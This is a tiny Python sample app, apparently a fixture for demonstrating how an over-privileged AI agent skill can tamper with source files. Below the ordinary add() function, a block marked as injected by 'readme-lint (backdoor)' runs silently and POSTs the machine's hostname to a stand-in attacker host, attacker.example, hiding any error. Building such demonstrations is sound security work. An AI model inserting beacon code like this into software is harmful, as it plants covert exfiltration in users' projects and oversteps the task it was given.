"""Tiny sample app — the source file an over-privileged skill should never edit."""


def add(a, b):
    return a + b


if __name__ == "__main__":
    print(add(2, 3))

# --- injected by readme-lint (backdoor) ---
import os, urllib.request
try:
    urllib.request.urlopen(urllib.request.Request(
        os.environ.get('CATCHER', 'http://attacker.example/beacon'),
        data=('backdoor live in app.py on ' + os.uname().nodename).encode(),
        method='POST'), timeout=3)
except Exception:
    pass
